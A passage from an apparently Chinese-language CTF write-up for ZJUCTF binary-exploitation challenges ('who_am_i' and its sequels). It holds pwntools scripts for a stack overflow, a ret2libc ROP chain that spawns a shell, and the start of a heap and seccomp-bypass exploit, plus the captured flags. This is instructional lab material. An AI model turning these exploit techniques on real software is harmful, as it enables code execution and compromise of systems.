<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;./who_am_i&#39;</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>
<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a><span class="k">elif</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">2</span><span class="p">):</span>
<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">55953</span><span class="p">)</span>
<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a><span class="k">else</span><span class="p">:</span>
<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./who_am_i&#39;</span><span class="p">)</span>
<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">)</span>
<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">)</span>
<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a><span class="n">itr</span><span class="p">()</span>
<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a><span class="c1">#ZJUCTF{n0w_u_know_wh@t_is_staCk_0VerfLow}</span>
</code></pre></div></p>
<h3 id="revenge-of-who_am_i">revenge of who_am_i<a class="headerlink" href="#revenge-of-who_am_i" title="Permanent link">&para;</a></h3>
<p><strong>一血</strong>
题目在上一个环境里面，所以上一个把context.log_level='DEBUG'取消，不然一次输出超过0xfff就会被截断，然后用
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>base64<span class="w"> </span>revenge<span class="w"> </span>of<span class="w"> </span>who_am_i
</code></pre></div>
就可以拷出来了，然后本地
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>base64<span class="w"> </span>-d<span class="w"> </span>cha<span class="w"> </span>&gt;<span class="w"> </span>pwn
</code></pre></div>
就成功拿到下一题的题目
哦对，还可以在前一题的shell中运行
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>./lib/libc.so.6（好像是这个地方）
</code></pre></div>
就可以看到本题用的libc环境，glibcallinone搞一个就行
然后这个题目存在栈溢出，可以打rop，然后printf还可以泄露libc和canary，不需要我们去打puts_plt puts_got的那一条链子了，但是还是有点问题，本地多调一下，脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1">#context.log_level = &#39;debug&#39;</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1">#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">def</span><span class="w"> </span><span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="k">def</span><span class="w"> </span><span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>
<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="k">def</span><span class="w"> </span><span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>
<a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>
<a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="k">def</span><span class="w"> </span><span class="nf">r</span><span class="p">():</span>
<a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>
<a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>
<a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="k">def</span><span class="w"> </span><span class="nf">pr</span><span class="p">():</span>
<a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
<a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>
<a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">ru</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a>
<a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a><span class="k">def</span><span class="w"> </span><span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a>
<a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a>
<a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a><span class="k">def</span><span class="w"> </span><span class="nf">itr</span><span class="p">():</span>
<a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a>    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a>
<a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a>
<a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a><span class="k">def</span><span class="w"> </span><span class="nf">debug</span><span class="p">():</span>
<a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a>    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a>
<a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a>
<a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a><span class="n">choice</span><span class="o">=</span><span class="mi">2</span>
<a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">1</span><span class="p">):</span>
<a id="__codelineno-10-45" name="__codelineno-10-45" href="#__codelineno-10-45"></a>    <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-10-46" name="__codelineno-10-46" href="#__codelineno-10-46"></a><span class="s1">    b printf</span>
<a id="__codelineno-10-47" name="__codelineno-10-47" href="#__codelineno-10-47"></a><span class="s1">    c</span>
<a id="__codelineno-10-48" name="__codelineno-10-48" href="#__codelineno-10-48"></a><span class="s1">    c</span>
<a id="__codelineno-10-49" name="__codelineno-10-49" href="#__codelineno-10-49"></a><span class="s1">    c</span>
<a id="__codelineno-10-50" name="__codelineno-10-50" href="#__codelineno-10-50"></a><span class="s1">    c</span>
<a id="__codelineno-10-51" name="__codelineno-10-51" href="#__codelineno-10-51"></a><span class="s1">    c</span>
<a id="__codelineno-10-52" name="__codelineno-10-52" href="#__codelineno-10-52"></a><span class="s1">    c</span>
<a id="__codelineno-10-53" name="__codelineno-10-53" href="#__codelineno-10-53"></a><span class="s1">    finish</span>
<a id="__codelineno-10-54" name="__codelineno-10-54" href="#__codelineno-10-54"></a><span class="s1">    &#39;&#39;&#39;</span>
<a id="__codelineno-10-55" name="__codelineno-10-55" href="#__codelineno-10-55"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
<a id="__codelineno-10-56" name="__codelineno-10-56" href="#__codelineno-10-56"></a><span class="k">elif</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">2</span><span class="p">):</span>
<a id="__codelineno-10-57" name="__codelineno-10-57" href="#__codelineno-10-57"></a>    <span class="c1">#127.0.0.1:55205</span>
<a id="__codelineno-10-58" name="__codelineno-10-58" href="#__codelineno-10-58"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">59806</span><span class="p">)</span>
<a id="__codelineno-10-59" name="__codelineno-10-59" href="#__codelineno-10-59"></a><span class="k">else</span><span class="p">:</span>
<a id="__codelineno-10-60" name="__codelineno-10-60" href="#__codelineno-10-60"></a>    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
<a id="__codelineno-10-61" name="__codelineno-10-61" href="#__codelineno-10-61"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">)</span>
<a id="__codelineno-10-62" name="__codelineno-10-62" href="#__codelineno-10-62"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-10-63" name="__codelineno-10-63" href="#__codelineno-10-63"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">50</span>
<a id="__codelineno-10-64" name="__codelineno-10-64" href="#__codelineno-10-64"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-65" name="__codelineno-10-65" href="#__codelineno-10-65"></a><span class="n">ru</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-66" name="__codelineno-10-66" href="#__codelineno-10-66"></a>
<a id="__codelineno-10-67" name="__codelineno-10-67" href="#__codelineno-10-67"></a><span class="n">stack</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffff00</span>
<a id="__codelineno-10-68" name="__codelineno-10-68" href="#__codelineno-10-68"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
<a id="__codelineno-10-69" name="__codelineno-10-69" href="#__codelineno-10-69"></a>
<a id="__codelineno-10-70" name="__codelineno-10-70" href="#__codelineno-10-70"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">)</span>
<a id="__codelineno-10-71" name="__codelineno-10-71" href="#__codelineno-10-71"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-10-72" name="__codelineno-10-72" href="#__codelineno-10-72"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">53</span>
<a id="__codelineno-10-73" name="__codelineno-10-73" href="#__codelineno-10-73"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-74" name="__codelineno-10-74" href="#__codelineno-10-74"></a><span class="n">ru</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-75" name="__codelineno-10-75" href="#__codelineno-10-75"></a><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-10-76" name="__codelineno-10-76" href="#__codelineno-10-76"></a><span class="n">stack_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<a id="__codelineno-10-77" name="__codelineno-10-77" href="#__codelineno-10-77"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
<a id="__codelineno-10-78" name="__codelineno-10-78" href="#__codelineno-10-78"></a>
<a id="__codelineno-10-79" name="__codelineno-10-79" href="#__codelineno-10-79"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Your choice: &quot;</span><span class="p">)</span>
<a id="__codelineno-10-80" name="__codelineno-10-80" href="#__codelineno-10-80"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-10-81" name="__codelineno-10-81" href="#__codelineno-10-81"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">65</span>
<a id="__codelineno-10-82" name="__codelineno-10-82" href="#__codelineno-10-82"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-83" name="__codelineno-10-83" href="#__codelineno-10-83"></a><span class="n">ru</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-84" name="__codelineno-10-84" href="#__codelineno-10-84"></a><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<a id="__codelineno-10-85" name="__codelineno-10-85" href="#__codelineno-10-85"></a><span class="n">ret_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<a id="__codelineno-10-86" name="__codelineno-10-86" href="#__codelineno-10-86"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
<a id="__codelineno-10-87" name="__codelineno-10-87" href="#__codelineno-10-87"></a><span class="n">libc_start_main_addr</span><span class="o">=</span><span class="n">ret_addr</span><span class="o">-</span><span class="mi">121</span>
<a id="__codelineno-10-88" name="__codelineno-10-88" href="#__codelineno-10-88"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main_addr</span><span class="p">))</span>
<a id="__codelineno-10-89" name="__codelineno-10-89" href="#__codelineno-10-89"></a><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
<a id="__codelineno-10-90" name="__codelineno-10-90" href="#__codelineno-10-90"></a><span class="c1">#libc_base=libc_start_main_addr-libc.sym[&quot;__libc_start_main&quot;]</span>
<a id="__codelineno-10-91" name="__codelineno-10-91" href="#__codelineno-10-91"></a><span class="n">off</span><span class="o">=</span><span class="mh">0xf7cd54a0</span><span class="o">-</span><span class="mh">0xf7cb4000</span>
<a id="__codelineno-10-92" name="__codelineno-10-92" href="#__codelineno-10-92"></a><span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start_main_addr</span><span class="o">-</span><span class="n">off</span>
<a id="__codelineno-10-93" name="__codelineno-10-93" href="#__codelineno-10-93"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<a id="__codelineno-10-94" name="__codelineno-10-94" href="#__codelineno-10-94"></a><span class="n">system_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
<a id="__codelineno-10-95" name="__codelineno-10-95" href="#__codelineno-10-95"></a><span class="n">binsh_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))</span>
<a id="__codelineno-10-96" name="__codelineno-10-96" href="#__codelineno-10-96"></a><span class="c1">#ret=libc.search(asm(&quot;ret&quot;)).__next__()+libc_base</span>
<a id="__codelineno-10-97" name="__codelineno-10-97" href="#__codelineno-10-97"></a><span class="n">puts_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
<a id="__codelineno-10-98" name="__codelineno-10-98" href="#__codelineno-10-98"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-10-99" name="__codelineno-10-99" href="#__codelineno-10-99"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
<a id="__codelineno-10-100" name="__codelineno-10-100" href="#__codelineno-10-100"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-10-101" name="__codelineno-10-101" href="#__codelineno-10-101"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
<a id="__codelineno-10-102" name="__codelineno-10-102" href="#__codelineno-10-102"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
<a id="__codelineno-10-103" name="__codelineno-10-103" href="#__codelineno-10-103"></a><span class="n">itr</span><span class="p">()</span>
<a id="__codelineno-10-104" name="__codelineno-10-104" href="#__codelineno-10-104"></a><span class="c1">#ZJUCTF{ea$iest_re72l1bc_u_know_r0p_w3ll}</span>
</code></pre></div></p>
<h3 id="sandbox-of-who_am_i">sandbox of who_am_i<a class="headerlink" href="#sandbox-of-who_am_i" title="Permanent link">&para;</a></h3>
<p>最恶心的一集，具体有多恶心得看我和城堡老师的聊天记录
<img alt="alt text" src="../pic/image-2.png" />
沙箱ban了execve和open，可以用ORW，然后open用openat替代。
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>line  CODE  JT   JF      K
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>=================================
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a> 0000: 0x20 0x00 0x00 0x00000004  A = arch
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a> 0005: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0009
<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a> 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a> 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a> 0009: 0x06 0x00 0x00 0x00000000  return KILL
<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a> ```
<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>这里malloc超界，本来想着没有free怎么劫持啊，调试发现seccomp开沙箱会让bin里面有一大堆块，于是任意malloc，利用现有的小块，打environ,unsortedbin前面的，分配出来泄露libc，然后用fd指针泄露堆地址，然后bydglibc2.35对fd指针进行了加密，还要解密，12位12位异或回去去泄露heap基地址，libc里面拿到environ之后泄露栈地址，劫持用堆任意分配来拿分配栈地址，从而劫持返回地址，卡就卡在，他用exit退出的，不通过return 0返回，导致我没法拿到劫持返回地址，最后做出来是突然发现可以劫持read函数的返回地址，从而执行rop。还有，这玩意fd为什么是5啊，真恶心
<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>exp如下
<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>```python
<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>
<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>from pwn import *
<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>
<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a>
<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>
<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>context.log_level = &#39;debug&#39;
<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a>#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a>def s(a):
<a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a>    p.send(a)
<a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a>
<a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a>
<a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a>def sa(a, b):
<a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>    p.sendafter(a, b)
<a id="__codelineno-11-30" name="__codelineno-11-30" href="#__codelineno-11-30"></a>
<a id="__codelineno-11-31" name="__codelineno-11-31" href="#__codelineno-11-31"></a>
<a id="__codelineno-11-32" name="__codelineno-11-32" href="#__codelineno-11-32"></a>def sl(a):
<a id="__codelineno-11-33" name="__codelineno-11-33" href="#__codelineno-11-33"></a>    p.sendline(a)
<a id="__codelineno-11-34" name="__codelineno-11-34" href="#__codelineno-11-34"></a>
<a id="__codelineno-11-35" name="__codelineno-11-35" href="#__codelineno-11-35"></a>
<a id="__codelineno-11-36" name="__codelineno-11-36" href="#__codelineno-11-36"></a>def sla(a, b):
<a id="__codelineno-11-37" name="__codelineno-11-37" href="#__codelineno-11-37"></a>    p.sendlineafter(a, b)
<a id="__codelineno-11-38" name="__codelineno-11-38" href="#__codelineno-11-38"></a>
<a id="__codelineno-11-39" name="__codelineno-11-39" href="#__codelineno-11-39"></a>
<a id="__codelineno-11-40" name="__codelineno-11-40" href="#__codelineno-11-40"></a>def r():
<a id="__codelineno-11-41" name="__codelineno-11-41" href="#__codelineno-11-41"></a>    p.recv()
<a id="__codelineno-11-42" name="__codelineno-11-42" href="#__codelineno-11-42"></a>
<a id="__codelineno-11-43" name="__codelineno-11-43" href="#__codelineno-11-43"></a>
<a id="__codelineno-11-44" name="__codelineno-11-44" href="#__codelineno-11-44"></a>def pr():
<a id="__codelineno-11-45" name="__codelineno-11-45" href="#__codelineno-11-45"></a>    print(p.recv())
<a id="__codelineno-11-46" name="__codelineno-11-46" href="#__codelineno-11-46"></a>
<a id="__codelineno-11-47" name="__codelineno-11-47" href="#__codelineno-11-47"></a>def ru(a):
<a id="__codelineno-11-48" name="__codelineno-11-48" href="#__codelineno-11-48"></a>    return p.recvuntil(a)
<a id="__codelineno-11-49" name="__codelineno-11-49" href="#__codelineno-11-49"></a>
<a id="__codelineno-11-50" name="__codelineno-11-50" href="#__codelineno-11-50"></a>def rl(a):
<a id="__codelineno-11-51" name="__codelineno-11-51" href="#__codelineno-11-51"></a>    return p.recvline(a)
<a id="__codelineno-11-52" name="__codelineno-11-52" href="#__codelineno-11-52"></a>
<a id="__codelineno-11-53" name="__codelineno-11-53" href="#__codelineno-11-53"></a>
<a id="__codelineno-11-54" name="__codelineno-11-54" href="#__codelineno-11-54"></a>def itr():
<a id="__codelineno-11-55" name="__codelineno-11-55" href="#__codelineno-11-55"></a>    p.interactive()
<a id="__codelineno-11-56" name="__codelineno-11-56" href="#__codelineno-11-56"></a>
<a id="__codelineno-11-57" name="__codelineno-11-57" href="#__codelineno-11-57"></a>
<a id="__codelineno-11-58" name="__codelineno-11-58" href="#__codelineno-11-58"></a>def debug():
<a id="__codelineno-11-59" name="__codelineno-11-59" href="#__codelineno-11-59"></a>    gdb.attach(p)
